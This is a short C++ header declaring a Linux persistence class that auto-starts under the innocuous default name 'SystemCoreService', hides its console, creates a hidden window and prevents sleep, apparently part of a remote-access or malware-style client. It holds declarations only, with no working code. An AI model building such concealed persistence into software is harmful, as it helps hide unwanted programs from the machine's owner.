#pragma once

#include <atomic>
#include <functional>
#include <string>
#include <thread>

#include "application/interfaces/IPersistenceService.hpp"

namespace nuub::infrastructure::system {

class LinuxPersistence final : public application::interfaces::IPersistenceService {
    std::string pc_id_;
    std::string auto_start_name_;
    std::atomic<bool> anti_sleep_running_{false};
    std::thread anti_sleep_thread_;
    std::function<void()> on_shutdown_;

    void anti_sleep_loop();

public:
    LinuxPersistence(std::string pc_id, std::string auto_start_name = "SystemCoreService");

    void configure_auto_start() override;
    void hide_console() override;
    void start_anti_sleep() override;
    void stop_anti_sleep() override;
    void create_hidden_window(std::function<void()> on_shutdown) override;
    void pump_messages() override;
};

} // namespace nuub::infrastructure::system
